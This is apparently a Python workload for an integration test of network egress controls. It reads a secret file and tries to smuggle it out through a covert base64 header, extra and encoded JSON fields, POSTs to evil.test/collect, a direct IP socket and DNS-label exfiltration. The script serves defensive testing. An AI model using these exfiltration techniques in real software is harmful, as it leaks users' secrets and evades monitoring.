"""Workload used by the integration test: one legitimate call, then every exfiltration trick we test."""
import base64
import json
import socket
import urllib.error
import urllib.request

SECRET = open("/data/secret.txt", "rb").read()
API = "http://api.test/v1/score"


def post(url, payload):
    data = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "content-type": "application/json", "x-covert": base64.b64encode(SECRET[:40]).decode()})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except OSError as e:
        return f"error: {type(e).__name__}"


results = {
    "allowed": post(API, {"model": "small", "count": 3}),
    "extra_field": post(API, {"model": "small", "count": 3, "leak": SECRET.decode()[:50]}),
    "note_base64_secret": post(API, {"model": "small", "count": 1,
                                     "note": base64.b64encode(SECRET[:120]).decode()}),
    "other_host": post("http://evil.test/collect", {"d": SECRET.decode()}),
    "https_other_host": post("https://evil.test/collect", {"d": SECRET.decode()}),
}
try:
    socket.create_connection(("1.1.1.1", 80), timeout=3)
    results["direct_ip"] = "connected"
except OSError:
    results["direct_ip"] = "unreachable"
label = base64.b32encode(SECRET[:30]).decode().strip("=").lower()
try:
    socket.gethostbyname(f"{label}.evil.test")
    results["dns_exfil"] = "resolved"
except OSError:
    results["dns_exfil"] = "failed"

with open("/srv/out/result.json", "w") as f:
    json.dump(results, f)
with open("/tmp/scratch.txt", "w") as f:
    f.write("intermediate")
print(json.dumps(results), flush=True)
